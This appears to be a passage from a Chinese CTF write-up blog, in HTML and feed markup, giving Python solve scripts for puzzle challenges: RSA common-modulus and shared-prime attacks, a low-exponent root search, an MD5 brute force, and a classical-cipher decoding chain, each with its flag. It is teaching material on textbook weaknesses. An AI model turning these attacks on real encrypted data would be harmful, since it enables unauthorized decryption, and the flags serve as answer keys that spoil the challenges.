s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lowEncryptionIndex</span>(<span class="params">c, n, e</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000000</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(k * n + c, e)[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(k * n + c, e)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag1 = <span class="number">463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line">    flag2 = <span class="number">130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line">    n = <span class="number">609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line">    e1e2 = <span class="number">3087</span></span><br><span class="line">    <span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e1e2):</span><br><span class="line">        <span class="keyword">if</span> e1e2 % e1 == <span class="number">0</span>:</span><br><span class="line">            e2 = e1e2 // e1</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(e1, e2):</span><br><span class="line">                c = RsaSameModuleAttack(e1, e2, flag1, flag2, n)</span><br><span class="line">                e = gmpy2.gcd(e1, e2)</span><br><span class="line">                result = lowEncryptionIndex(c, n, e)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(long_to_bytes(result))</span><br></pre></td></tr></tbody></table></figure><blockquote><p>运行时间会比较长：</p><p>b’\x10H\x9e<del>\xdd\x1f9\xbd\x96\xa1u\xa1oVxR\xe4\x84\xe4fb\xc5\x1bKfO\xddE\xb5*\xf6”\x91zY\xb2\x8f\xe7\x89\xcd\x046\xd9\x12\x1d9\xe7\x14\x08\xb3\xd6\xcd\x8f\xb7\xa1v+\xba\x85\xe0(:w\xce\xf5ol\xe9;\x8e\xd0b\x1e\x14\n\x92\x0b\xe9\x99\xd5G\x95\x082\xb4\xc3\x8cL\xd5\x0c^p\xec\xa4\x01\x88E\x15\x8a}i%K`\xf5\xff\xfen&lt;\x0e\xc3\x88u\x07\x82\xb8\xdc\xbf\xb0\xcba\xe3\xe1\xeb\xbf</del>\xc0\x12#\xfd8\x02I\x83\xc5\xcffr\xdb\x85\xf6\xed\x93\x10\n\x1b\xfb\x10M\xa1\xa1\x82t\xcb\xbc\xae\x19\x91R\x81\xd0\xdc\xafF\xba\x95A\xe6\x02\x06Lyu\xb2Iv\xb5\xdf\x1d-=\x16\xe7@)\x83m\x08Y\xca$V\xcaI\xc1<em>\xf0\xcf\x94:ca\xc4\x0f\xa2\xf4\nz\xbbR\x90\x01\,\xdf;\xe0|\xbb\xc1\xab\xf4k\xb7^\xb9T\xcc;Xp\x9e\xe9\xed\xf7\x83\x10\xeb<code>r\xf3?\xd9\x81 \xf7)\xf6\xdd\xb9\xb8\x12B\x913_$\xbd\x0fm!&gt;\xd2\'~P\x9f\xbcJ\xb0\xf1B\xbd\x17!\x9co\xeb/\x08&lt;\xad\xfb\xe7R\xbc\x11\xc8\x845\x062\x10\x82\xc6p\xbb\xe7$\x8b\x08N\x06\xa80\x9f\n\x90T\x9bd\xd1\xa9\x80\xab\xad\x8c6\xcf\x80\xe0\xa8*7\x99\x1f\xb2\xf92}\x1d\xb1w\xb1\xb8\x9f;\x06\x0bC\xc5\xfeG\xc3M\xfcg\xa0h\x8d\xac\rl\xb4F\xb9\xb5\xaa\xcc\x9f\xf9</code>6V\xf69\xec\x8e=:\xf5K%\xd3\xe3!OC\xd6\xcb,\xaa|P3\x07\xdfF\xb9\x12\xeb\x84\xe4\xc6;g\x08\xab\x1a\x9b\xfe\x10\x96l\x9dP:\xc5\xf8\x00L\xd6L7\x10\x10\x1c\xb5\xeb\x9dT\xc2Y\xd9s\x8d\x99\xb5[.\xd5\xfe\x95Q\xc4$~F\xad\x1d-?\x0fo\xd1\xbe\r\xa0\xeb\xf9X\xd3”\x13\x03Tm2=\xb7\x87Fs\x07\x8dJ&lt;\xe8\xe2bL$\xab\x83\x00Y\r\xea\xe6_Y\xc7\xcf\x1b\x02\xf26\xd7]\xb8\xc0\xe2'\x86\x9b\xc4x\x99\x10\x92\xdbF\x95\xc3\x13M|j\xe1\xa7w\xd7’<br>b’NSSCTF{d64dba66-b608-4255-b888-0b0f25c2f90e}’<br>b’Y\x81U\xd5&lt;R[w\x10\xe6\x1d9\xecq?\x01\x1ew\x1cq\xa6\xa9&gt;\x8fH|F\x0f37\xf7\xb9\xd8\xf1\n\xff\xac\xba\xc8\xa5j\xec\xe78\x19\xf2\x831B\xca\x96\xd12\xa3L2\xb6\xaf\xe6\xfd\x16\xe3ER\x87L\xc6[\x929\xbd\xd2=\x12\x9c\x991\x86$0\x16\xd9\x8c\xf5m\xa53'\xf0\xe9\xa9L\x8c\xc6\x13/1\xf1D\xc2\xb2\xa1\xd7\xe8\x81k6m\xfa\x86;\xb9X\x86\x85`\xe3\x9f\x84\xfaW\xf2\x1d\xe5\xe4\xa5\xb9K\xed\x16\xdb\xdb\xbe\x00:\x7f\x91|+\xba\x90\x8c\xd4\xc4)&gt;6\xf81\xe7\xff\xb6M0\x80\xfd2J#\x16\xb8\xb4\x10\xed\xc4S4\xd3?\xf0\x0b\rG</em>8\x8e\xa8\xceU\t2+\xbe\xb1\x0er\x98o9\xf5{\x1ab\x03,G\nn\r\xf6\x1a\xd1v\xe7\x9dO\xdf\x7f\x9d\xb2\xf8\x13\x84\xea\xc5\x83\xc5\x11\xea\x9c\xe1\xfc\x8aWs\xb17\x88\xa8\xfa\xd3\x1d\xf9\x9c\x08X\xdc\xdc\x8d J1igg\x97\x10}V\xa0?\xca\x91\x84\xd5\xcf\xc0\x90\x8c\x94\xf1)\xd9pl\xddJ\x91r2q\xfd?\xcc\xbd\xde\r\xe7\xe2#7tmI\x9c\xea\xee\\x99lME\xbb\xe5\xb5\xaf]\xf2\x08\xec\x16\x01(M\xab\xfan\xc9\x02\x0e\x7f\x94Z<em>\x8e\xad\xaa\xa5g\xb7h\xc5d\xdc%y\x91\xcfS_.\x93\xac\xc9/\x86\xdf\xe0\xf0L\x96\x17\x82H\xd7\xa8c\xefEZ\xd4p\x16”\xcc\x00\xa7\xaa\r\xbe\x9f}\xd9\\xe3\xd9\xde\x9c[\xa6\xd25\xddx\xb0\xb5\xcd5\xe9u</em>\x04\xbf\xcfZ\xa4=\x8eE\x91\xf3'\xe627F\x0f\x9b&amp;\x1d\xd6lG\xdb\xa5\x91\xab\xc4\x1f\n]\x9e\xf5F\xe2\xc3\xac\xbf+2\xec\xc1\xb3\x89\x8b\x91.\x9c\xe73\xd0\xb4v\xdd\x83\xb3t\x02\x01\x98\xc1tsP\x90\xde\xf3\x85\xcd\xda\xd6u_\xab\x0eIvs\x01{oQI\x1c\xbd{\x945\xfc\xa5\xe2c\x16\x9e)\xb0\x80D\xb2%\xa45\xca\x94\xdc\xd2v=\xd9{-~&amp;*\xfa\x94j\x80\xab&amp;\xdcS\xf1\x92\x91^\xa5\x13\\xe5\xb3Z’</p></blockquote><hr><h2 id="37-BJDCTF-2020-rsa-output"><a href="#37-BJDCTF-2020-rsa-output" class="headerlink" title="37 [BJDCTF 2020]rsa_output"></a>37 [BJDCTF 2020]rsa_output</h2><p>🚩flag：<code>NSSCTF{r3a_C0mmoN_moD@_4ttack}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>,<span class="number">2767</span>}</span><br><span class="line"></span><br><span class="line">{<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>,<span class="number">3659</span>}</span><br><span class="line"></span><br><span class="line">message1=<span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line"></span><br><span class="line">message2=<span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两组公钥模数相同 =&gt; 共模攻击</span></span><br><span class="line">n = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2767</span></span><br><span class="line">n1 = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line">c1 = <span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">3659</span></span><br><span class="line">n2 = <span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span></span><br><span class="line">c2 = <span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 共模攻击时， gcd(e1, e2) = 1 =&gt; 存在s1 s2使得 e1*s1+e2*s2 = 1  s1与s2一正一负</span></span><br><span class="line"><span class="comment"># 并且有m = (c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="comment"># gmpy2.gcdext(e1,e2) 用于求式子 e1*x+e2*y=gcd(e1,e2) 的解</span></span><br><span class="line"><span class="comment">#   Return a 3-element tuple (g,s,t) such that</span></span><br><span class="line"><span class="comment">#         g == gcd(a,b) and g == a*s + b*t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_mod_same_N</span>(<span class="params">e1, c1, e2, c2, n</span>):</span><br><span class="line">    s, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(s, s1, s2)</span><br><span class="line">    m = gmpy2.mod(gmpy2.powmod(c1, s1, n)*gmpy2.powmod(c2,s2,n), n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">m = rsa_mod_same_N(e1, c1, e2, c2, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>1 -201 152<br>b‘BJD{r3a_C0mmoN_moD@_4ttack}’</p></blockquote><hr><h2 id="38-闽盾杯-2021-decode"><a href="#38-闽盾杯-2021-decode" class="headerlink" title="38 [闽盾杯 2021]decode"></a>38 [闽盾杯 2021]decode</h2><p>🚩flag：<code>NSSCTF{G00d_w4y_tO_cR4ck_RS4}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">n1:</span><br><span class="line"><span class="number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span></span><br><span class="line">n2:</span><br><span class="line"><span class="number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span></span><br><span class="line">n3:</span><br><span class="line"><span class="number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span></span><br><span class="line">e1:</span><br><span class="line"><span class="number">65537</span></span><br><span class="line">e2:</span><br><span class="line"><span class="number">27751</span></span><br><span class="line">e3:</span><br><span class="line"><span class="number">65537</span></span><br><span class="line">c1:</span><br><span class="line"><span class="number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span></span><br><span class="line">c2:</span><br><span class="line"><span class="number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span></span><br><span class="line">c3:</span><br><span class="line"><span class="number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591</span></span><br><span class="line">n2 = <span class="number">28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749</span></span><br><span class="line">n3 = <span class="number">18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">27751</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206</span></span><br><span class="line">c2 = <span class="number">21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741</span></span><br><span class="line">c3 = <span class="number">13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486</span></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q = gmpy2.gcd(n2,n3)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">p,q,e,c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    m = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">attack(p,n1 // p,e1,c1)</span><br><span class="line">attack(p,n2 // p,e2,c2)</span><br><span class="line">attack(q,n3 // q,e3,c3)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>b”hahaha, you’ve got the flag didn’t you !the front part is :flag{G00d_w4”<br>b”hahaha, you’ve got the flag didn’t you !the middle part is :y_tO_cR”<br>b”hahaha, you’ve got the flag didn’t you !the last part is :4ck_RS4}”</p></blockquote><hr><h2 id="39-LitCTF-2023-md5的破解"><a href="#39-LitCTF-2023-md5的破解" class="headerlink" title="39 [LitCTF 2023]md5的破解"></a>39 [LitCTF 2023]md5的破解</h2><p>🚩flag：<code>NSSCTF{md5can123dexrypt213thoughcrpsh}</code></p><p>💡hint：<code>md5</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag全是由小写字母及数字组成</span></span><br><span class="line">m=md5(flag).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag[:<span class="number">13</span>]+flag[<span class="number">15</span>:<span class="number">18</span>]+flag[<span class="number">19</span>:<span class="number">34</span>]+flag[<span class="number">35</span>:<span class="number">38</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b'LitCTF{md5can3derypt213thoughcrsh}'</span></span><br><span class="line"><span class="comment"># 496603d6953a15846cd7cc476f146771</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 附件信息</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from hashlib import md5</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># #flag全是由小写字母及数字组成</span></span><br><span class="line"><span class="comment"># m=md5(flag).hexdigest()</span></span><br><span class="line"><span class="comment"># print(flag[:13]+flag[15:18]+flag[19:34]+flag[35:38])</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="comment"># b'LitCTF{md5can3derypt213thoughcrsh}'</span></span><br><span class="line"><span class="comment"># 496603d6953a15846cd7cc476f146771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码：</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">dic = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_}{'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> dic:</span><br><span class="line">              s = <span class="string">'LitCTF{md5can'</span>+i+j+<span class="string">'3de'</span>+k+<span class="string">'rypt213thoughcr'</span>+l+<span class="string">'sh}'</span></span><br><span class="line">              <span class="built_in">print</span>(s)</span><br><span class="line">              <span class="keyword">if</span> hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest() == <span class="string">'496603d6953a15846cd7cc476f146771'</span>:</span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">"Find it: "</span>+s)</span><br><span class="line">                 exit(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>LitCTF{md5can123dexrypt213thoughcrpsh}</p></blockquote><hr><h2 id="40-WUSTCTF-2020-佛说：只能四天"><a href="#40-WUSTCTF-2020-佛说：只能四天" class="headerlink" title="40 [WUSTCTF 2020]佛说：只能四天"></a>40 [WUSTCTF 2020]佛说：只能四天</h2><p>🚩flag：<code>NSSCTF{ni_hao_xiang_xiang_da_wo}</code></p><p>💡hint：<code>其他</code></p><p>圣经分为《旧约全书》和《新约全书》</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑</span><br></pre></td></tr></tbody></table></figure><p>题目中的圣经分为《旧约全书》和《新约全书》应该是指只有新约佛伦禅才解的出来<br>然后出来的是社会主义核心价值观，解完以后是一串字符，根据提示得出这啥栅栏密码<br>在栅栏解密的穷举中找到R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_<br>得出凯撒加密，穷举结果，发现都是大写，且数字范围位2~7，应该是base32<br>解出wctf2020{ni_hao_xiang_xiang_da_wo}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Reverse暑期刷题记录</title>
